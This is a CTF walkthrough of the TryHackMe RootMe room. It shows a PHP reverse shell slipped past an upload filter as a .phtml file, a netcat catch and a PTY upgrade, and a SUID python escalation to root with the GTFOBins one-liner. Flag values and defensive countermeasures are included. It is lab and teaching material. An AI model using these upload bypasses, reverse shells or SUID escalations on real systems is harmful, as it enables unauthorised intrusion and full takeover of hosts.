---
title: "TryHackMe: RootMe — Apache File Upload Filter Bypass & SUID Python Privilege Escalation"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [linux, gobuster, nmap, file-upload-bypass, phtml, python, suid, gtfobins, privesc]
render_with_liquid: false
date: 2026-10-06 18:00:00 +0530
---

**RootMe** is a foundational Linux CTF room on TryHackMe designed to test essential web exploitation and privilege escalation methodology. This walkthrough details web enumeration with **GoBuster**, circumventing Apache extension validation via `.phtml`, catching an unprivileged shell, and exploiting an atypical SUID permission on `/usr/bin/python` (referencing GTFOBins) to obtain full root privileges.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme) |
| **Target OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Attack Vector** | Web File Upload Bypass (`.phtml`), SUID Binary Privilege Escalation (`/usr/bin/python`) |
| **Key Utilities** | `nmap`, `gobuster`, `netcat`, `python` |

---

## Attack Chain Execution

```
[Phase 1: Reconnaissance]
   │── Nmap Scan -> Port 22 (SSH), Port 80 (Apache 2.4.29)
   └── GoBuster directory enumeration:
         /panel/   (HTTP 301 - File Upload Portal)
         /uploads/ (HTTP 301 - Upload Storage Directory)
         │
[Phase 2: Weaponized File Upload]
   │── Attempting to upload shell.php -> Server Error: "PHP não é permitido!"
   │── Extension Fuzzing: .phtml, .php3, .php4, .php5
   │── Upload shell.phtml -> Success!
   └── Trigger shell via: http://target/uploads/shell.phtml
         │
[Phase 3: Initial Shell Access]
   │── Netcat listener catches connection: www-data
   └── Retrieve user flag: /var/www/user.txt (THM{y0u_g0t_a_sh3ll})
         │
[Phase 4: SUID Privilege Escalation]
   │── Find SUID binaries: find / -user root -perm /4000 2>/dev/null
   │── Atypical SUID discovered: /usr/bin/python
   │── GTFOBins SUID escape invocation:
   │     /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
   └── Shell elevated to effective UID 0 (root) ──> Root Flag Captured (#)
```

---

## Phase 1: Port Scanning & Directory Discovery

Initiate an Nmap service scan:

```console
$ nmap -sC -sV -T4 10.10.98.210
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
```

Next, enumerate hidden endpoints using `gobuster`:

```console
$ gobuster dir -u http://10.10.98.210/ -w /usr/share/wordlists/dirb/common.txt -t 40
===============================================================
/css                  (Status: 301) [Size: 310]
/js                   (Status: 301) [Size: 309]
/panel                (Status: 301) [Size: 312]
/uploads              (Status: 301) [Size: 314]
===============================================================
```

We identify two key routes:
- `/panel/`: Hosts an unauthenticated file upload interface.
- `/uploads/`: Direct directory listing where uploaded assets are stored.

---

## Phase 2: Circumventing File Upload Filters

Attempting to upload a standard PHP reverse shell named `shell.php` triggers an immediate validation error:

> **"PHP não é permitido!" (PHP is not permitted!)**

The server checks the file extension against a naive blacklist. In many default Apache configurations, multiple extensions can be mapped to the PHP handler. We test alternative extensions:
- `.php3`
- `.php4`
- `.php5`
- `.phtml`

Renaming the reverse shell to `shell.phtml`:

```console
$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.phtml
# (Configure attacker IP and listening port 4444)
```

Uploading `shell.phtml` at `http://10.10.98.210/panel/` succeeds with a green confirmation message.

---

## Phase 3: Shell Ingress & TTY Upgrade

Start a local Netcat listener:

```console
$ nc -lvnp 4444
```

Trigger the shell by navigating to `http://10.10.98.210/uploads/shell.phtml`. The listener catches the connection:

```console
connect to [10.10.14.30] from (UNKNOWN) [10.10.98.210] 38412
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

Upgrade the raw shell to an interactive PTY session:

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@rootme:/$ export TERM=xterm
```

---

## Phase 4: SUID Python Privilege Escalation

Search the filesystem for binaries with the SUID bit configured:

```console
www-data@rootme:/$ find / -user root -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/python
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/su
```

The presence of **`/usr/bin/python`** with SUID root permissions (`-rwsr-xr-x`) is a severe security misconfiguration.

### Weaponizing Python via GTFOBins
Because the binary has the SUID bit set, Python executes with the effective UID of its owner (`root`). Using the `-p` (preserve privileges) flag in a spawned shell prevents the process from dropping elevated privileges:

```console
www-data@rootme:/$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

We now have full, unrestricted root control over the operating system.

---

## Defensive Countermeasures

1. **Strict File Upload Validation**:
   - Enforce an explicit **allowlist** of benign file extensions (e.g., `.png`, `.jpg`).
   - Store uploaded user content on an isolated storage domain or object bucket (AWS S3) completely decoupled from executable server application runtimes.
   - Strip execution permissions from the storage directory via web server configuration:
     ```apache
     <Directory "/var/www/html/uploads">
         php_flag engine off
         RemoveHandler .phtml .php .php3 .php4 .php5
     </Directory>
     ```

2. **SUID Permission Auditing**:
   - Compilers, scripting interpreters (`python`, `perl`, `ruby`), and text editors must **never** possess SUID permissions.
   - Run automated compliance audits using `cis-cat` or `lynis` to flag unexpected SUID binaries on all production hosts.
